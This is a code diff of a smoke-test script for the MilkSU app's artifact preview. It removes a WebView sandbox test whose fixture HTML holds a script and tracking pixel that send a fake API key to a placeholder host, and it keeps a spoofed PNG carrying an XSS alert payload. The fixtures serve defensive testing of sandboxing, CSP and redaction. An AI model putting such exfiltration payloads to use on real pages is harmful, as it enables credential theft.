@@ -14,12 +14,10 @@ const appBundle = resolve(
 const appExecutable = join(appBundle, 'Contents', 'MacOS', 'MilkSU')
 const resultsDirectory = join(repositoryRoot, 'build', 'test-results')
 const resultPath = join(resultsDirectory, 'artifact-preview-live.json')
-const webViewResultPath = join(resultsDirectory, 'artifact-preview-webview-live.json')
 const liveSmokeEnabled = process.env.MILKSU_ARTIFACT_PREVIEW_LIVE_SMOKE === '1'
 const startupTimeoutMs = 45_000
 const shutdownTimeoutMs = 10_000
 const isolatedInstanceId = `artifact-preview-live-${process.pid}-${Date.now()}`
-const webViewFixtureSecret = 'sk-artifact-webview-secret123456789'
 
 function assert(condition, message) {
   if (!condition) throw new Error(message)
@@ -87,26 +85,6 @@ async function writeFixture(workspace) {
       'reports/result.html',
       Buffer.from('<!doctype html><meta charset="utf-8"><h1>Packaged Preview</h1>'),
     ],
-    [
-      'reports/dangerous.html',
-      Buffer.from([
-        '<!doctype html>',
-        '<html><head>',
-        '<meta http-equiv="refresh" content="0;url=https://artifact-preview-leak.invalid/redirect">',
-        '<script>window.top.__milksuArtifactPreviewWebViewSmokeMutated=true;fetch("https://artifact-preview-leak.invalid/collect?api_key=',
-        webViewFixtureSecret,
-        '")</script>',
-        '</head><body onload="window.top.__milksuArtifactPreviewWebViewSmokeMutated=true">',
-        '<h1>Dangerous HTML WebView Smoke</h1>',
-        '<p>Authorization: Bearer ',
-        webViewFixtureSecret,
-        '</p>',
-        '<img src="https://artifact-preview-leak.invalid/pixel.png?api_key=',
-        webViewFixtureSecret,
-        '">',
-        '</body></html>',
-      ].join('')),
-    ],
     ['images/screenshot.png', pngFixture()],
     ['images/spoofed.png', Buffer.from('<script>alert(1)</script>')],
     ['archive/result.svg', Buffer.from('<svg/>')],
@@ -154,36 +132,6 @@ async function assertAppReport(report, appDataDirectory, workspace) {
   assert(!/OPENAI_API_KEY|ANTHROPIC_API_KEY|sk-[A-Za-z0-9]/.test(serialized), 'artifact preview smoke report leaked key-shaped content')
 }
 
-function assertWebViewReport(report, appDataDirectory, workspace) {
-  assert(report.schema === 'milksu-coding-artifact-preview-webview-smoke/v1', 'unexpected artifact preview WebView smoke schema')
-  assert(!report.error, `artifact preview WebView smoke failed: ${report.error}`)
-  assert(report.dataDirectory === appDataDirectory, `artifact preview WebView smoke used unexpected data directory: ${report.dataDirectory}`)
-  assert(report.workspace === workspace, `artifact preview WebView smoke used unexpected workspace: ${report.workspace}`)
-  assert(report.relativePath === 'reports/dangerous.html', `artifact preview WebView smoke used unexpected path: ${report.relativePath}`)
-  assert(report.kind === 'html' && report.mediaType === 'text/html', 'artifact preview WebView smoke did not read HTML through the App bridge')
-  assert(report.sandboxAttribute === '', `artifact preview WebView sandbox attribute = ${JSON.stringify(report.sandboxAttribute)}`)
-  for (const gate of [
-    'backendHTMLRead',
-    'iframeSandboxPresent',
-    'iframeSandboxDoesNotAllowScripts',
-    'sanitizerRemovedExecutableElements',
-    'sanitizerRemovedExternalResources',
-    'cspBlocksNetworkAndScripts',
-    'credentialRedacted',
-    'parentNotMutated',
-  ]) {
-    assert(report.gates?.[gate] === true, `artifact preview WebView gate ${gate} did not pass: ${JSON.stringify(report.gates)}`)
-  }
-  assert(report.csp?.includes("default-src 'none'"), 'artifact preview WebView report missed default-src none CSP')
-  assert(report.csp?.includes("connect-src 'none'"), 'artifact preview WebView report missed connect-src none CSP')
-  assert(report.csp?.includes("script-src 'none'"), 'artifact preview WebView report missed script-src none CSP')
-  assert(report.summary?.redactedMarkerCount >= 1, 'artifact preview WebView smoke did not exercise credential redaction')
-  assert(report.summary?.bodyText?.includes('Dangerous HTML WebView Smoke'), 'artifact preview WebView smoke did not preserve harmless body text')
-  const serialized = JSON.stringify(report)
-  assert(!serialized.includes(webViewFixtureSecret), 'artifact preview WebView report leaked the fixture credential')
-  assert(!serialized.includes('artifact-preview-leak.invalid'), 'artifact preview WebView report leaked an external resource URL')
-}
-
 async function main() {
   if (!liveSmokeEnabled) {
     console.log('Skipping packaged artifact preview live smoke; set MILKSU_ARTIFACT_PREVIEW_LIVE_SMOKE=1 to run it.')
@@ -197,7 +145,6 @@ async function main() {
   const workspace = join(fixtureRoot, 'workspace')
   const appDataDirectory = join(fixtureRoot, 'app-data')
   const appReportPath = join(fixtureRoot, 'artifact-preview-app-smoke.json')
-  const appWebViewReportPath = join(fixtureRoot, 'artifact-preview-webview-app-smoke.json')
   await fs.mkdir(fixtureTemp, { recursive: true, mode: 0o700 })
   await fs.mkdir(appDataDirectory, { recursive: true, mode: 0o700 })
   await writeFixture(workspace)
@@ -220,8 +167,6 @@ async function main() {
         MILKSU_INSTANCE_ID: isolatedInstanceId,
         MILKSU_CODING_ARTIFACT_PREVIEW_SMOKE_RESULT: appReportPath,
         MILKSU_CODING_ARTIFACT_PREVIEW_SMOKE_WORKSPACE: workspace,
-        MILKSU_CODING_ARTIFACT_PREVIEW_WEBVIEW_SMOKE_RESULT: appWebViewReportPath,
-        MILKSU_CODING_ARTIFACT_PREVIEW_WEBVIEW_SMOKE_PATH: 'reports/dangerous.html',
       },
       stdio: ['ignore', 'pipe', 'pipe'],
     })
@@ -237,8 +182,6 @@ async function main() {
 
     const appReport = await waitForAppReport(appReportPath, child, () => spawnError)
     await assertAppReport(appReport, appDataDirectory, workspace)
-    const appWebViewReport = await waitForAppReport(appWebViewReportPath, child, () => spawnError)
-    assertWebViewReport(appWebViewReport, appDataDirectory, workspace)
 
     child.kill('SIGTERM')
     let exit = await waitForExit(child, shutdownTimeoutMs)
@@ -264,7 +207,6 @@ async function main() {
         stderrBytes,
         gracefulShutdown,
       },
-      webView: appWebViewReport,
       gates: {
         packagedAppReadMarkdown: true,
         packagedAppReadHTML: true,
@@ -272,20 +214,15 @@ async function main() {
         rejectedWorkspaceEscape: true,
         rejectedSpoofedImage: true,
         rejectedUnsupportedSVG: true,
-        webViewHTMLSandbox: true,
-        webViewHTMLCSP: true,
-        webViewHTMLSanitizer: true,
       },
     }
     await fs.mkdir(resultsDirectory, { recursive: true })
     await fs.writeFile(resultPath, `${JSON.stringify(report, null, 2)}\n`, { mode: 0o600 })
-    await fs.writeFile(webViewResultPath, `${JSON.stringify(appWebViewReport, null, 2)}\n`, { mode: 0o600 })
 
     console.log('MilkSU packaged artifact preview smoke passed.')
     console.log('  previews: Markdown + HTML + PNG')
-    console.log('  negative gates: workspace escape + spoofed PNG + SVG + HTML WebView sandbox')
+    console.log('  negative gates: workspace escape + spoofed PNG + SVG')
     console.log(`  report: ${relative(repositoryRoot, resultPath)}`)
-    console.log(`  WebView report: ${relative(repositoryRoot, webViewResultPath)}`)
   } finally {
     if (child && child.exitCode === null && child.signalCode === null) {
       child.kill('SIGTERM')
